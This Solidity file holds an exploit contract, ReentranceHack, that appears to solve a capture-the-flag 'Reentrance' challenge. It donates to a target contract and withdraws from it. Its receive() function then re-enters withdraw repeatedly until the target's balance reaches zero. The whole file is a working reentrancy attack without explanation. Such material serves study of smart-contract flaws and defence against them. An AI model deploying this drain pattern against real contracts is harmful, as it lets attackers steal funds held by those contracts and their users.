// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceHack {

    address payable target;
    uint amt;

    constructor (address payable _target, uint _amt) {
        target = _target;
        amt = _amt;
    }

    function attack() external payable {
        require(msg.value == amt, "value not match");
        Reentrance(target).donate{value: amt}(address(this));
        Reentrance(target).withdraw(amt);

        uint targetBalance = target.balance; 
        require(targetBalance == 0, "balance of target is not zero");
    }

    receive() external payable {
        uint rest = target.balance;
        if (rest > 0) {
            Reentrance(target).withdraw(amt);
        }
    }
}